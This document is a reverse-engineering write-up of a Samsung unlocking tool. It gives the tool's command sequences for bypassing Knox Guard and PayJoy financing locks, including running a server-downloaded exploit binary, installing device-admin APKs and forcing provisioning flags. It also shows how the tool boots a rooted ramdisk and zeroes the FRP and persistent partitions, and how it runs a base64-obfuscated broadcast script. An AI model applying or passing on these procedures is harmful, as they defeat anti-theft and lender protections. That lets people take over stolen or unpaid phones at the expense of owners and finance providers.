# samsung.md — Samsung domain (Moto-M Tool)

How Moto-M Tool 4.2.2 handles Samsung: Knox Guard (KG) lock/bypass,
PayJoy MDM bypass, Exynos boot repair via Download Mode, AT-command
ADB-enable for Android 16, and the DNS/EULA FRP methods.

## Device info (Samsung KG view)

Properties read via ADB (`full_kg_lock_process` L6050, `run_bypass_knox_cloud_flow` L5469):

```python
{'Model': 'ro.product.model',        'Brand': 'ro.product.brand',
 'CPU': 'ro.boot.hardware',          'Build Version': 'ro.build.version.incremental',
 'CSC': 'ro.boot.carrierid',         'Security Patch': 'ro.build.version.security_patch',
 'Android Release': 'ro.build.version.release', 'SDK': 'ro.build.version.sdk',
 'Knox State': 'knox.kg.state'}
# + settings get global device_name
```

## KG state change (server-driven exploit)

Two entry paths, both ending in the same exploit chain:

```
check knox.kg.state (getprop)
if locked:
    GET /get-download-link?exploit=kg  → {'url'}
    download → Resources/New-KG-Exploit (binary, streamed)
push New-KG-Exploit → /data/local/tmp/New-KG-Exploit
chmod +x /data/local/tmp/New-KG-Exploit
push 4.apk (com.motomtool.motomtool) → /data/local/tmp/4.apk
pm install /data/local/tmp/4.apk                      # must print 'Success'
dpm set-active-admin --user 0 \
    com.samsung.rms.retailagent.global/\
    com.samsung.sta.mi.rm.receivers.EnterpriseDeviceAdminReceiver
/data/local/tmp/New-KG-Exploit                        # run exploit
sleep 3; check knox.kg.state again
```

The exploit binary itself is fetched live from the server (`exploit=kg`
param) — not shipped in the installer.

### Full KG lock process (`full_kg_lock_process`, L6038; method popup: Normal / DNS)

```
ensure_adb_running → get_first_device → device info
[dns] → run_dns_method_authorized(device)             # see below
[normal]:
  init_device (push 2.apk = com.sdet.fotaagent, pm install; fail → 'New Security Detected')
  if knox.kg.state == 'locked': KG-state exploit chain (above)
  then 'new KG Security flow':
    am start --user 0 -n com.motomtool.motomtool/.DisableFactoryReset   # disable factory reset
    run server commands 'new_parte_1' (GET /get-kg-lock-commands?parte=new_parte_1)
    push 3.apk, pm install
    run server commands 'new_parte_2'
    wait for device disconnect (reboot) ≤60 s, reconnect + sys.boot_completed == '1'
    run server commands 'new_parte_3'
    reboot → 'Bypass Kg Locked Completed'
  if still locked after exploit:
    start_broadcast(device) (see below) → run server commands 'parte_1' ...
```

### KG "Knox Cloud" bypass (`run_bypass_knox_cloud_flow`, L5410)

Server-command-driven ADB flow using the YouTube app as a lock canary
(`com.google.android.youtube`, enabled state 3 = ENABLED):

```
1. get_first_device; device info
2. fetch server commands: knox_list, parte_1, parte_2
   (GET /get-mdm-lock-commands?parte=...)
3. 'Looking For Locks': for each cmd in parte_1:
     cmd.replace('pkg', 'com.google.android.youtube') → device.shell(cmd)
     sleep 0.1; check_enabled_state(device, pkg) == 3 → found
4. 'Looking For Secondary Locks': for each cmd in parte_2:
     same; check_if_installed(device, pkg) → gone
5. wait sys.boot_completed == '1' (≤150 s)
6. 'Applying final settings' (≤120 s, verify each):
     settings put global setup_wizard_has_run 1   ← get → must be '1'
     settings put secure  user_setup_complete 1   ← get → must be '1'
     settings put global device_provisioned 1     ← get → must be '1'
7. restore canary on every failure path:
     pm install-existing --user 0 com.google.android.youtube
     pm enable --user 0 com.google.android.youtube
```

Helpers (L4472–4497): `check_enabled_state` = `dumpsys package {pkg}`
→ regex `User 0:.*enabled=(\d+)`; `check_if_installed` = same dumpsys →
`installed=(\w+)` == 'true'.

## PayJoy MDM bypass (`run_bypass_payjoy_flow`, L4500)

Same server-command pattern as Knox Cloud:

```
1. get_device_info
2. fetch MDM commands: list, parte_1, parte_2
   (GET /get-mdm-lock-commands?parte=list|parte_1|parte_2)
3. for each cmd in parte_1: cmd.replace('pkg', <canary>) → shell; sleep 0.1
   enabled_state == 3 → primary lock found
4. for each cmd in parte_2: same; not check_if_installed → secondary found
5. restore canary: pm install-existing --user 0 <pkg>; pm enable --user 0 <pkg>
```

The actual `pm`/`am` command lists live server-side
(`/get-mdm-lock-commands`); the client only substitutes the canary
package name. Canary here is also `com.google.android.youtube`.

## Exynos boot repair via Download Mode (`run_exynos_boot_repair_flow`, L5082)

```
1. find_samsung_download_port() (L4878):
     for each COM port: 'SAMSUNG MOBILE USB MODEM' in desc/hwid.upper()
     and ('VID:PID=04E8' or 'VID_04E8' or vid == 1256)
2. read_samsung_download_info(port) (L4892):
     serial.Serial(port, 115200, 8, PARITY_NONE, STOPBITS_ONE,
                   timeout=0, write_timeout=1, rtscts=True, dsrdtr=False)
     dtr=False; rts=False; reset buffers
     write b'DVIF'; flush; read for ~0.45–1.0 s
3. parse_samsung_dvif(raw) (L4908):
     decode latin1, strip '\x00\r\n\t '; split ';'
     strip '#', '@'; split 'k=v' pairs → dict
4. log_samsung_download_info: fields
     MODEL, SALES→CSC, VER→VERSION, UN→UNIQUE NUMBER, VENDOR→VENDOR,
     PRODUCT→DISK, CAPA→CAPACITY, FWVER, DID, NAD_TEMP, TMU_TEMP
5. fetch_exynos_session(model, need_link) (L5010):
     POST /exynos-session {'model': <MODEL>, 'need_link': bool}
     → {'soc': ..., 'key': ..., 'url': ...}
6. ensure_exynos_package (L5022): Resources/Exynos.MTool
     (Fernet-encrypted 7z; missing → download from session['url'])
7. extract_exynos_package (L5067): Fernet(key).decrypt → py7zr extract
     to temp dir (Windows: icacls-locked down — inheritance:r, grant user/
     SYSTEM/Administrators, L4934)
8. find_exynos_cli: ExynosCli.exe in extract dir + presets/ folder
   select_exynos_preset: presets/{soc}_dpolicy_extract.json or
     {soc}_dpolicy_integrity.json (prefix match)
9. run: ExynosCli.exe --exynos-dir <dir> --action boot --preset <preset> --port <port>
     progress: 'booting custom ramdisk' → 8 %, +8 %/line up to 96 %;
     'boot completed successfully' → done
```

The `--action boot` flow boots a custom ramdisk (rooted boot) on the
Exynos device via Samsung Download Mode — the presets contain
per-SoC dpolicy JSON.

### Samsung boot partition repair (`run_samsung_boot_partition_repair_flow`, L5233)

```
1. run_exynos_boot_repair_flow(manage_ui=False)          # boot rooted ramdisk
2. wait_for_adb_authorized(180) → adb_root_ready() (L5198):
     adb root (×2, ≤25 s) — 'already running as root' or
     'restarting adbd as root'
3. find_repair_block_paths(device) (L5216):
     ls -al /dev/block/by-name/ → match 'persistent' and 'frp'
     → [(name, /dev/block/...)]
4. push 512 KiB zero-file (b'\x00' * 524288) over each block path
5. reboot → 'FRP Removed successfully.'
```

I.e. with the rooted ramdisk booted, wipe `frp` + `persistent` blocks
by pushing zeros.

## AT commands for Samsung Android 16 (`run_at_commands_a16_flow`, L5310)

```
1. find Samsung modem port: description/manufacturer/hwid contains
   'samsung' or 'samsung mobile usb modem'
2. AT+DEVCONINFO @ 460800 baud, timeout 2, retries 3
3. parse fields: MN→Model, VER→Firmware Version, AID→CSC,
   CC→Country Code, SN→Serial Number, IMEI→IMEI, UN→Board ID,
   CON→Connection Type
4. run AT command sequence via send_at_command(port, cmd, baudrate,
   timeout=2, retries=3)
```

## DNS/EULA FRP methods

`run_dns_method_eula` (L5902) — "Bypass EULA Financed":

```
1. push 5.apk (com.motomtool.motomtool) → /data/local/tmp/5.apk; pm install
2. server commands 'parte_1_dns' (GET /get-eula-commands?parte=parte_1_dns)
   → run each via device.shell
3. server commands 'parte_2_dns' → first two outputs must verify:
     verify_dns_outputs(out1, out2): out1 contains 'hostname',
     out2 matches \b[a-z0-9.-]+\.com\b
4. run remaining parte_2_dns commands → device.reboot()
```

`run_dns_method_authorized` (L5946) — same, prefixed by the KG-state
exploit chain if `knox.kg.state == 'locked'`.

`run_bypass_payjoy_flow` / EULA / KG flows share `fetch_commands_from_server`
/ `fetch_mdm_commands_from_server`: `GET /get-kg-lock-commands` /
`/get-mdm-lock-commands` / `/get-eula-commands` with `?parte=<part>`,
headers `HWID/TIMESTAMP/VERSION-HASH`, → `{'commands': [...]}`.

## Broadcast helper (`start_broadcast`, L5838)

Used when the device is still KG-locked after the exploit:

```
mkdir /sdcard/mdmfixtool
am start -n com.sdet.fotaagent/.Main          # retry ×10 until visible in
                                              # dumpsys window windows
push Resources/Special/Samsung/resource-data → /data/local/tmp/resource-data
chmod +x /data/local/tmp/resource-data
adb -s <serial> shell /data/local/tmp/resource-data
```

`resource-data` is a `#!/system/bin/sh` script whose payload is a
base64-encoded `am broadcast -a com.sdet.fotaagent... -e FILE -e ...`
command (drives the FOTA-agent app to run intents on the locked device).

## Samsung APKs (Resources/Special/Samsung/)

| File | Package | Role |
|---|---|---|
| 1.apk | `com.motomtool.motomtool` | tool's own device-owner app |
| 2.apk | `com.sdet.fotaagent` | FOTA agent (KG/EULA broadcast runner) |
| 3.apk | (helper) | KG 'new security' flow |
| 4.apk | (helper, datatransport/cct deps) | KG exploit companion |
| 5.apk | `com.motomtool.motomtool` | EULA/DNS bypass device-owner app |

Samsung Download-mode port VID: `04E8` (0x04E8 / 1256).
